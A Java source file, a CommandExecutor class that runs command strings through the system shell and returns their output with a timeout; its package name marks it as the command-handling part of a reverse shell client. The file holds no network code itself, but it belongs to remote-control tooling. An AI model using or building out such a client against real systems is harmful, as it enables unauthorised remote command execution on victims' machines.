package obs1d1anc1ph3r.reverseshell.client.commandhandling;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

import obs1d1anc1ph3r.reverseshell.client.plugins.CDCommand;
import obs1d1anc1ph3r.reverseshell.client.utils.OSUtils;

public class CommandExecutor {

	private static final String SHELL;
	private static final String SHELLFLAG;

	static {
		SHELL = OSUtils.getShell();
		SHELLFLAG = OSUtils.getShellFlag();
	}

	public String executeCommand(String command) {
		Process process = null;
		try {
			ProcessBuilder builder = new ProcessBuilder(SHELL, SHELLFLAG, command);
			builder.redirectErrorStream(true);
			builder.directory(new File(CDCommand.getCurrentDirectory()));

			process = builder.start();

			String output;
			try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
				output = reader.lines().collect(Collectors.joining("\n"));
			}

			boolean finished = process.waitFor(10, TimeUnit.SECONDS);
			if (!finished) {
				process.destroy();
				return "Error: Command timed out.";
			}

			int exitCode = process.exitValue();
			if (exitCode != 0) {
				return "[ERROR] Exit code: " + exitCode + "\n" + output;
			}

			return output.isEmpty() ? "[INFO] Command executed but returned no output." : output.trim();

		} catch (IOException | InterruptedException e) {
			return "Error executing command: " + e.getMessage();
		} finally {
			if (process != null) {
				process.destroy(); // Ensure the process is cleaned up
			}
		}
	}
}
